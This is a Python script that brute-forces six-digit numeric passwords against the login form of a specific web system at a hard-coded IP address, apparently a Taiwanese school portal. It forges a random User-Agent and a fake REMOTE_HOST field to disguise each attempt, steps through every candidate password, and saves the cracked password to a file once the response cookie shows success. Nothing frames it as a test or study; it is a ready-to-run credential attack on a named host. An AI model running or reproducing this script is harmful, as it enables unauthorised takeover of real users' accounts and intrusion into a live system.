import os
from datetime import datetime, timedelta, timezone

import requests
from fake_useragent import UserAgent
from faker import Faker

ua = UserAgent()
faker = Faker()
def startrun(passwd,username,start):
    while True:
        header = {'User-Agent':ua.chrome,'Upgrade-Insecure-Requests':'1','Referer':'http://140.126.151.12/csnskj/Permain.asp','Origin':'http://140.126.151.12','Host':'140.126.151.12','Content-Type':'application/x-www-form-urlencoded','Content-Length':'169','Connection':'keep-alive','Cache-Control':'max-age=0','Accept-Language':'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7','Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','Accept-Encoding': 'gzip, deflate'}
        if len(str(passwd)) == 1:
            spasswd = '00000' + str(passwd)
        if len(str(passwd)) == 2:
            spasswd = '0000' + str(passwd)
        if len(str(passwd)) == 3:
            spasswd = '000' + str(passwd)
        if len(str(passwd)) == 4:
            spasswd = '00' + str(passwd)
        if len(str(passwd)) == 5:
            spasswd = '0' + str(passwd)
        if len(str(passwd)) == 6:
            spasswd = str(passwd)
        if start == True:
            if passwd > 1000000:
                print('fuck failed')
                os._exit(0)
        else:
            if passwd == 0:
                print('fuck failed')
                os._exit(0)
        
    
        r = requests.post('http://140.126.151.12/csnskj/Reg_Per.ASP',data={
        'SCH_NO':'',
        'Time':'',
        'LEVEL':'0',
        'REMOTE_HOST':str(faker.ipv4()),
        'txtT_NO':'',
        'txtName':username.encode('big5'),
        'txtPass':spasswd
        },headers=header,allow_redirects=False)
        r.encoding = 'big5'
        rheader = r.headers['Set-Cookie']
        if 'mPass' in rheader:
            #we fuck out the real passwd
            file = open('passwd.txt','a+')
            file.write(str(spasswd)+'\n')
            file.close()
            print('\n passwd is ' +spasswd)
            break
        else:
            #not yet
            if start == True:
                file = open('failed.txt','w')
            if start == False:
                file = open('failedf.txt','w')
            file.write(str(spasswd)+'\n')
            file.close()
            if start == True:
                passwd += 1
            else:
                passwd -= 1
            if start == True:
                dt1 = datetime.utcnow().replace(tzinfo=timezone.utc)
                dt2 = dt1.astimezone(timezone(timedelta(hours=8))) # 轉換時區 -> 東八區
                twt=dt2.strftime("%Y-%m-%d %H:%M:%S")
                print("\r Running in two thread...."+spasswd+",Time:"+twt,end = "")


